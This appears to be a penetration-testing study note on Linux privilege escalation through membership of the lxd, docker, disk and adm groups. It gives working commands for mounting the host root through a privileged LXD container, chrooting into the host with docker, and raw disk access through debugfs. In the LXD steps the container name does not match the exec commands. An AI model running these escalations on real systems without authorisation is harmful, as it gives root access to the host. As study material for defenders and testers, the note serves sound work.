# LXC / LXD

**LXD** is similar to Docker and is Ubuntu's container manager. Upon installation, all users are added to the LXD group. Membership of this group can be used to escalate privileges by creating an LXD container, making it privileged, and then accessing the host file system at `/mnt/root`

```bash
devops@NIX02:~$ id

uid=1009(devops) gid=1009(devops) groups=1009(devops),110(lxd)
```

Unzip the **Alpine image** → A minimal Docker image based on Alpine Linux.

```bash
unzip alpine.zip 
#output
Archive:  alpine.zip
extracting: 64-bit Alpine/alpine.tar.gz  
inflating: 64-bit Alpine/alpine.tar.gz.root  
cd 64-bit\ Alpine
```

Import the local image.

```bash
lxc image import alpine-v3.18-x86_64-20230607_1234.tar.gz --alias alpine
lxc image list
```

Start a privileged container with the `security.privileged` set to `true` t**o run the container without a UID** mapping, **making the root user in the container the same as the root user on the host.**

```bash
lxc init alpine r00t -c security.privileged=true
```

Mount the host file system.

```bash
lxc config device add r00t host-root disk source=/ path=/mnt/root recursive=true
```

spawn a shell inside the container instance

```bash
lxc start r00t

lxc exec privesc /bin/bash 
lxc exec privesc /bin/sh
# try **sh** shell because alpine is light 
```

***

***

## Docker

discover groups

```bash
id

uid=1001(user) gid=1001(user) groups=1001(user),**999(docker)**
```

which meaning u can run docker with any privilege like the root user

```bash
# exploit
docker run -v /:/mnt --rm -it ubuntu chroot /mnt
```

***

***

## Disk

if user found in disk group that’s meaning this user can write on any system disks like `/dev/sda1`

```bash
id

groups=1001(user),6(disk
```

```bash
# exploit
sudo debugfs /dev/sda1
```

***

***

## ADM

if user found in Adm group that’s meaning this user can read logs on the system `/var/log`

```bash
id

groups=1001(user),4(adm)
```

```bash
cat /var/log/auth.log
cat /var/log/cron.log
```

***

[Lab](https://www.notion.so/Lab-1de1d1e7e13c8089a327fdd818909917?pvs=21)
